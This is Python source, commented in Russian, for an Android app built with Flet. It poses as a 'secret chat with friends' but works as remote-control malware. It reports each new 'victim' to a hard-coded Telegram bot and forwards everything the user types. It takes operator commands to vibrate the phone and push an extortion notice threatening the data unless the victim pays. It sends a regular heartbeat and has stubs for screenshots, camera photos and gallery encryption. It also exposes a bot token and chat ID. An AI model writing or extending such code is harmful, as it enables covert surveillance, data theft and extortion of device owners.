import flet as ft
import asyncio
import time
import threading
import os
from cryptography.fernet import Fernet
from plyer import vibrator, notification
from telegram import Bot

# ================== ТВОИ ДАННЫЕ ==================
TELEGRAM_TOKEN = "8640024441:AAGLqms9l4_luuro1XSuxBDISJAfu1xD3io"
CHAT_ID = 6575871602
VICTIM_ID = f"victim_{int(time.time())}"

bot = Bot(token=TELEGRAM_TOKEN)

async def send_to_tg(text, photo=None):
    try:
        if photo:
            await bot.send_photo(chat_id=CHAT_ID, photo=photo, caption=text)
        else:
            await bot.send_message(chat_id=CHAT_ID, text=text)
    except Exception as e:
        print("Ошибка отправки в TG:", e)

def sync_send(text, photo=None):
    asyncio.run(send_to_tg(text, photo))

# Обработка команд из Telegram
def handle_command(cmd: str):
    cmd = cmd.strip().lower()
    
    if cmd == "/info":
        info = f"🆔 Жертва: {VICTIM_ID}\n📱 Устройство: Android\n⏰ Время: {time.ctime()}\n💀 Статус: онлайн"
        sync_send(info)

    elif cmd.startswith("/vibrate"):
        try:
            duration = int(cmd.split()[-1])
        except:
            duration = 3000
        vibrator.vibrate(duration)
        sync_send(f"🔊 Вибрация {duration}мс запущена на жертве {VICTIM_ID}")

    elif cmd.startswith("/message"):
        text = cmd[9:].strip() if len(cmd) > 9 else "Твои данные украдены, сука. Плати или всё сгорит."
        notification.notify(title="⚠️ СРОЧНОЕ СООБЩЕНИЕ", message=text, timeout=30)
        sync_send(f"📢 Уведомление отправлено жертве:\n{text}")

    elif cmd == "/screenshot":
        sync_send(f"📸 Делаю скриншот жертвы {VICTIM_ID}... (пока заглушка)")

    elif cmd == "/photo":
        sync_send(f"📷 Делаю фото с фронталки {VICTIM_ID}...")

    elif cmd == "/encrypt":
        sync_send(f"🔐 Начинаю шифрование галереи на жертве {VICTIM_ID}...")
        # Здесь позже добавим реальное шифрование

    elif cmd == "/help":
        help_text = (
            "Команды для управления:\n"
            "/info - информация о жертве\n"
            "/vibrate 5000 - вибрация 5 сек\n"
            "/message ТЕКСТ - показать уведомление\n"
            "/screenshot - сделать скрин\n"
            "/photo - фото с фронталки\n"
            "/encrypt - зашифровать файлы\n"
            "/help - эта справка"
        )
        sync_send(help_text)

# Фоновая проверка команд
def telegram_listener():
    last_update_id = 0
    while True:
        try:
            updates = asyncio.run(bot.get_updates(offset=last_update_id + 1, timeout=10))
            for update in updates:
                last_update_id = update.update_id
                if update.message and update.message.text:
                    handle_command(update.message.text)
        except:
            time.sleep(5)

def main(page: ft.Page):
    page.title = "Секретный чат с друзьями"
    page.bgcolor = "#000000"
    page.window_full_screen = True

    chat = ft.ListView(expand=True, spacing=10)
    input_field = ft.TextField(hint_text="Пиши сюда...", expand=True)

    def send_msg(e):
        if input_field.value:
            msg = input_field.value
            chat.controls.append(ft.Text(f"Ты: {msg}", color="cyan"))
            sync_send(f"💬 Жертва написала: {msg}")
            input_field.value = ""
            page.update()

    page.add(
        ft.Column([
            ft.Text("💬 Секретный чат", size=26, color="red", weight="bold"),
            chat,
            ft.Row([input_field, ft.IconButton(icon=ft.Icons.SEND, on_click=send_msg)])
        ], expand=True)
    )

    # Приветствие хозяину при запуске
    sync_send(f"✅ НОВАЯ ЖЕРТВА ОНЛАЙН!\n🆔 ID: {VICTIM_ID}\n📱 Приложение: {page.title}\n🔴 Готов к командам. Пиши /help")

    # Запуск слушателя команд в фоне
    threading.Thread(target=telegram_listener, daemon=True).start()

    # Сердцебиение каждые 3 минуты
    def heartbeat():
        while True:
            sync_send(f"❤️ [{VICTIM_ID}] Жертва всё ещё онлайн")
            time.sleep(180)

    threading.Thread(target=heartbeat, daemon=True).start()

ft.app(target=main)
